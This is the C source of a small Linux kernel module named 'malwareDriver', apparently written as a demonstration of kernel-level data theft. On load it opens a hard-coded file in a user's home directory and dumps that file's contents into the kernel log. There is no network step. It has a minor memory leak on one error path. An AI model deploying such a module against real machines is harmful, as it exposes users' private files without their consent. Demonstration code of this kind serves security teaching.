
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>

#define SECRET_PATH "/home/tony/Documents/mySecret.txt"
#define BUFFER_SIZE 512

////////////////////////////////////////////////////////////////
// Function which reads at most BUFFER_SIZE bytes from the file at SECRET_PATH.
// Note that reading files in the kernel is EXTREMELY DANGEROUS!!!
// Please see this blog post for further detail: linuxjournal.com/article/8110
//////////////////////////////////////////////////////////////////
static void readFile(void)
{
  struct file* filePtr;
  char* buf;
  loff_t pos = 0;
  ssize_t bytesRead;
  printk(KERN_DEBUG);
  
  buf= kmalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!buf)
  {
    printk("Error: Failed to allocate memory\n");
    return;
  }
  
  filePtr = filp_open(SECRET_PATH, O_RDONLY, 0);
  if (IS_ERR(filePtr))
  {
    printk("Error: Failed to open file %s\n", SECRET_PATH);
    return;
  }
  
  bytesRead = kernel_read(filePtr, buf, BUFFER_SIZE-1, &pos);
  if (bytesRead > 0)
  {
    buf[bytesRead] = '\0';
    printk("Contents of %s:\n%s\n", SECRET_PATH, buf);
  }
  else
  {
    printk("Error: Failed to read file %s\n", SECRET_PATH);
  }
  
  filp_close(filePtr, NULL);
  kfree(buf);
}

////////////////////////////////////////////////////////////////
// Init function
//////////////////////////////////////////////////////////////////
static int __init malInit(void)
{
  printk(KERN_INFO "malwareDriver loaded!\n");
  readFile();
  return 0;
}

////////////////////////////////////////////////////////////////
// Exit function
//////////////////////////////////////////////////////////////////
static void __exit malExit(void)
{
  printk(KERN_INFO "malwareDriver unloaded!\n");
}

// Define module stuff
module_init(malInit);
module_exit(malExit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tony Faller");
MODULE_DESCRIPTION("This driver emulates a potential data leak from kernel-level malware.");
